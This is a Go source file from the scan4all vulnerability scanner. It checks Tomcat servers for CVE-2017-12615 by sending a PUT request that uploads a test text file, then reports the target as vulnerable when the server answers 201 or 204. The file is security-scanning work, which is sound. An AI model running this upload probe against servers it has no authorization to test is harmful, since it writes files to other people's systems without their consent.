package tomcat

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

func CVE_2017_12615(url string) bool {
	if req, err := util.HttpRequset(url+"/vtset.txt", "PUT", "testnmanp", false, nil); err == nil {
		if req.StatusCode == 204 || req.StatusCode == 201 {
			util.SendLog(req.RequestUrl, "CVE-2017-12615", "Found vuln Tomcat", "testnmanp")
			return true
		}
	}
	return false
}
